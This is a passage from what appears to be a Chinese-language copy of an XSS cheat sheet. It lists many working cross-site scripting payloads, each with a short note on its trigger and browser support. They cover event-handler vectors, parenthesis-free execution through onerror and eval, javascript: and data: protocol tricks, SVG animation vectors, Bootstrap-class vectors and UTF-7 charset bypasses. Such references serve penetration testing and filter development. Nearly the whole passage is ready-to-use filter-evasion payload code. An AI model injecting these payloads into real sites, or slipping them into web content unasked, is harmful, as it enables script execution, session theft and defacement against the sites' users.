<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>drag me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">ondrop</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">contenteditable</span>&gt;</span>drop here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要作为价值的变化（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">oninput</span>=alert(1) <span class="hljs-attribute">value</span>=xss&gt;</code></pre>

<p>需要具有不满足其约束的元素（例如必填属性）的表单提交。（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">oninvalid</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">required</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span>&gt;</span></code></pre>

<p>按下键时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onkeydown</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>按下键时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onkeypress</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>释放按键时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onkeyup</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>按下鼠标时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmousedown</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>当鼠标悬停在元素上时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseenter</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseleave</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要鼠标移动（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmousemove</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseout</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要将鼠标悬停在元素上（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>释放鼠标按钮时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseup</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要粘贴一段文字（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onpaste</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>需要点击元素才能暂停（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio autoplay controls <span class="hljs-attribute">onpause</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>需要点击（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onreset</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">reset</span>&gt;</span></code></pre>

<p>提交表单并且输入具有搜索的type属性时触发（Chrome）</p>
<pre><code class="hljs routeros">&lt;form&gt;&lt;input <span class="hljs-attribute">type</span>=search <span class="hljs-attribute">onsearch</span>=alert(1) <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;Hit return&quot;</span> autofocus&gt;</code></pre>

<p>需要点击元素时间轴（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio autoplay controls <span class="hljs-attribute">onseeked</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>需要点击元素时间轴（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio autoplay controls <span class="hljs-attribute">onseeking</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>需要选择文字（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">onselect</span>=alert(1) <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;XSS&quot;</span> autofocus&gt;</code></pre>

<p>需要提交表单（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span>&gt;</span></code></pre>

<p>需要在页面上的任意位置单击并重新加载（Chrome)</p>
<pre><code class="hljs pgsql">&lt;svg onunload=<span class="hljs-keyword">window</span>.<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>)&gt;</code></pre>

<p>需要调节音量（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs routeros">&lt;audio autoplay controls <span class="hljs-attribute">onvolumechange</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre>

<p>使用鼠标滚轮时触发（Chrome、Firefox、IE、Safari)</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onwheel</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre>

<h3 id="限制字符"><a href="#限制字符" class="headerlink" title="限制字符"></a>限制字符</h3><p>无括号，使用异常处理</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>无括号，无分号，使用异常处理</p>
<pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><span class="hljs-template-variable">&#123;onerror=alert&#125;</span><span class="xml"><span class="javascript"><span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>

<p>无括号的异常处理，没有使用表达式的半冒号</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">throw</span> onerror=alert,<span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>无括号异常处理和evil</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">throw</span> onerror=<span class="hljs-built_in">eval</span>,<span class="hljs-string">&#x27;=alert\x281\x29&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>无括号，在Firefox上使用异常处理和evil</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="hljs-built_in">eval</span>&#125;<span class="hljs-keyword">throw</span>&#123;<span class="hljs-attr">lineNumber</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">columnNumber</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">fileName</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">message</span>:<span class="hljs-string">&#x27;alert\x281\x29&#x27;</span>&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>无括号，使用ES6 hasInstance和instanceof与eval</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-string">&#x27;alert\x281\x29&#x27;</span><span class="hljs-keyword">instanceof</span>&#123;[<span class="hljs-built_in">Symbol</span>.hasInstance]:<span class="hljs-built_in">eval</span>&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>无括号，使用ES6的hasInstance和instanceof以及eval</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-string">&#x27;alert\x281\x29&#x27;</span><span class="hljs-keyword">instanceof</span>&#123;[<span class="hljs-built_in">Symbol</span>[<span class="hljs-string">&#x27;hasInstance&#x27;</span>]]:<span class="hljs-built_in">eval</span>&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>无括号，使用位置重定向</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location=<span class="hljs-string">&#x27;javascript:alert\x281\x29&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>无字符串，使用位置没有括号重定向</p>
<pre><code class="hljs applescript">&lt;<span class="hljs-keyword">script</span>&gt;location=<span class="hljs-built_in">name</span>&lt;/<span class="hljs-keyword">script</span>&gt;</code></pre>

<p>无括号，使用模板字符串</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<h3 id="前端框架"><a href="#前端框架" class="headerlink" title="前端框架"></a>前端框架</h3><p>Bootstrap onanimationstart事件</p>
<pre><code class="hljs routeros">&lt;xss <span class="hljs-attribute">class</span>=progress-bar-animated <span class="hljs-attribute">onanimationstart</span>=alert(1)&gt;</code></pre>

<p>Bootstrap ontransitionend事件</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xss</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;carousel slide&quot;</span> <span class="hljs-attr">data-ride</span>=<span class="hljs-string">carousel</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">100</span> <span class="hljs-attr">ontransitionend</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xss</span> <span class="hljs-attr">class</span>=<span class="hljs-string">carousel-inner</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xss</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;carousel-item active&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xss</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xss</span> <span class="hljs-attr">class</span>=<span class="hljs-string">carousel-item</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xss</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xss</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xss</span>&gt;</span></code></pre>

<h3 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h3><p>iframe src属性JavaScript协议</p>
<pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</code></pre>

<p>具有JavaScript协议的对象data属性</p>
<pre><code class="hljs haskell">&lt;object <span class="hljs-class"><span class="hljs-keyword">data</span>=&quot;javascript:alert(1)&quot;&gt;</span></code></pre>

<p>使用JavaScript协议嵌入src属性</p>
<pre><code class="hljs routeros">&lt;embed <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</code></pre>

<p>标准的JavaScript协议</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>不区分大小写的协议</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;JaVaScript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>协议之前允许使用字符\x01- \x20</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;     javascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>协议中允许使用字符\ x09，\x0a，\x0d</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javas    cript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>协议名称后在冒号前允许字符\x09，\x0a，\x0d</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javas  cript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>带有JavaScript协议的SVG中的Xlink命名空间</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>使用值的SVG动画标签</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animate</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">#xss</span> <span class="hljs-attr">attributeName</span>=<span class="hljs-string">href</span> <span class="hljs-attr">values</span>=<span class="hljs-string">javascript:alert(1)</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">xss</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">20</span> <span class="hljs-attr">y</span>=<span class="hljs-string">20</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>SVG动画标签用于</p>
<pre><code class="hljs routeros">&lt;svg&gt;&lt;animate xlink:<span class="hljs-attribute">href</span>=#xss <span class="hljs-attribute">attributeName</span>=href <span class="hljs-attribute">from</span>=javascript:alert(1) <span class="hljs-attribute">to</span>=1 /&gt;&lt;a <span class="hljs-attribute">id</span>=xss&gt;&lt;text <span class="hljs-attribute">x</span>=20 <span class="hljs-attribute">y</span>=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre>

<p>SVG设置标签</p>
<pre><code class="hljs routeros">&lt;svg&gt;&lt;<span class="hljs-builtin-name">set</span> xlink:<span class="hljs-attribute">href</span>=#xss <span class="hljs-attribute">attributeName</span>=href <span class="hljs-attribute">from</span>=? <span class="hljs-attribute">to</span>=javascript:alert(1) /&gt;&lt;a <span class="hljs-attribute">id</span>=xss&gt;&lt;text <span class="hljs-attribute">x</span>=20 <span class="hljs-attribute">y</span>=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre>

<p>脚本src中的数据协议</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/javascript,alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>SVG脚本href属性，无需关闭脚本标签</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;data:text/javascript,alert(1)&quot;</span> /&gt;</span></code></pre>

<p>SVG使用元素Chrome/Firefox</p>
<pre><code class="hljs nix">&lt;svg&gt;&lt;use <span class="hljs-attr">href=&quot;data:image/svg+xml,&lt;svg</span> <span class="hljs-attr">id=&#x27;x&#x27;</span> <span class="hljs-attr">xmlns=&#x27;http://www.w3.org/2000/svg&#x27;</span> xmlns:<span class="hljs-attr">xlink=&#x27;http://www.w3.org/1999/xlink&#x27;</span> <span class="hljs-attr">width=&#x27;100&#x27;</span> <span class="hljs-attr">height=&#x27;100&#x27;&gt;&lt;a</span> xlink:<span class="hljs-attr">href=&#x27;javascript:alert(1)&#x27;&gt;&lt;rect</span> <span class="hljs-attr">x=&#x27;0&#x27;</span> <span class="hljs-attr">y=&#x27;0&#x27;</span> <span class="hljs-attr">width=&#x27;100&#x27;</span> <span class="hljs-attr">height=&#x27;100&#x27;</span> /&gt;&lt;/a&gt;&lt;/svg&gt;<span class="hljs-comment">#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span></code></pre>

<p>带有数据URL的导入语句</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;data:text/javascript,alert(1)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>具有JavaScript协议的基本标记重写了相对URL</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:/a/-alert(1)///////&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">../lol/safari.html</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>MathML使任何标签都可点击</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">math</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">x</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>blah</code></pre>

<p>按钮和动作</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>XSS</code></pre>

<p>输入和形式</p>
<pre><code class="hljs routeros">&lt;form&gt;&lt;input <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">formaction</span>=javascript:alert(1) <span class="hljs-attribute">value</span>=XSS&gt;</code></pre>

<p>形式与行动</p>
<pre><code class="hljs routeros">&lt;form <span class="hljs-attribute">action</span>=javascript:alert(1)&gt;&lt;input <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">value</span>=XSS&gt;</code></pre>

<p>Isindex和formaction</p>
<pre><code class="hljs routeros">&lt;isindex <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">formaction</span>=javascript:alert(1)&gt;</code></pre>

<p>index和action</p>
<pre><code class="hljs routeros">&lt;isindex <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">action</span>=javascript:alert(1)&gt;</code></pre>

<p>将元素与外部网址一起使用</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//subdomain1.portswigger-labs.net/use_element/upload.php#x&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre>

<h3 id="其他有用的属性"><a href="#其他有用的属性" class="headerlink" title="其他有用的属性"></a>其他有用的属性</h3><p>使用srcdoc属性</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre>

<p>对实体使用srcdoc</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="hljs-symbol">&amp;gt;</span>&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre>

<p>在页面上的任何位置（甚至在表单外部）单击提交元素</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">x</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></code></pre>

<p>隐藏的输入：访问键属性可以在通常无法利用的元素上启用XSS</p>
<pre><code class="hljs elm">&lt;input <span class="hljs-keyword">type</span>=&quot;hidden&quot; accesskey=&quot;<span class="hljs-type">X</span>&quot; onclick=&quot;alert(1)&quot;&gt; (<span class="hljs-type">Press</span> <span class="hljs-type">ALT</span>+<span class="hljs-type">SHIFT</span>+<span class="hljs-type">X</span> on <span class="hljs-type">Windows</span>) (<span class="hljs-type">CTRL</span>+<span class="hljs-type">ALT</span>+<span class="hljs-type">X</span> on <span class="hljs-type">OS</span> <span class="hljs-type">X</span>)</code></pre>

<p>链接元素：访问键属性可以在通常无法利用的元素上启用XSS</p>
<pre><code class="hljs sas">&lt;<span class="hljs-meta">link</span> rel=<span class="hljs-string">&quot;canonical&quot;</span> accesskey=<span class="hljs-string">&quot;X&quot;</span> onclick=<span class="hljs-string">&quot;alert(1)&quot;</span> /&gt; (Press ALT+SHIFT+<span class="hljs-meta">X</span> <span class="hljs-meta">on</span> Windows) (CTRL+ALT+<span class="hljs-meta">X</span> <span class="hljs-meta">on</span> OS <span class="hljs-meta">X</span>)</code></pre>

<p>下载属性可以保存当前网页的副本</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=# <span class="hljs-attribute">download</span>=<span class="hljs-string">&quot;filename.html&quot;</span>&gt;Test&lt;/a&gt;</code></pre>

<p>使用Referrerpolicy禁用引荐来源网址</p>
<pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">referrerpolicy</span>=<span class="hljs-string">&quot;no-referrer&quot;</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//portswigger-labs.net&quot;</span>&gt;</code></pre>

<h3 id="特殊标签"><a href="#特殊标签" class="headerlink" title="特殊标签"></a>特殊标签</h3><p>重定向到其他域</p>
<pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0; url=//portswigger-labs.net&quot;</span>&gt;</code></pre>

<p>元字符集属性UTF-7</p>
<pre><code class="hljs applescript">&lt;meta charset=<span class="hljs-string">&quot;UTF-7&quot;</span> /&gt; +ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre>

<p>元字符集UTF-7</p>
<pre><code class="hljs applescript">&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-7&quot;</span> /&gt; +ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre>

<p>UTF-7 BOM字符（必须在文档开头）1</p>
<pre><code class="hljs applescript">+/v8
+ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre>

<p>UTF-7 BOM字符（必须在文档开头）2</p>
<pre><code class="hljs applescript">+/v9
+ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre>

<p>UTF-7 BOM字符（必须在文档开头）3</p>
<pre><code class="hljs applescript">+/v+
+ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre>

<p>UTF-7 BOM字符（必须在文档开头）4</p>
<pre><code class="hljs applescript">+/v/
+ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre>

<p>升级不安全的请求</p>
<pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;upgrade-insecure-requests&quot;</span>&gt;</code></pre>

<p>通过iframe沙箱禁用JavaScript</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">sandbox</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//portswigger-labs.net&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre>

<p>禁用引荐来源</p>
<pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span>&gt;</code></pre>

<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p>超长UTF-8</p>
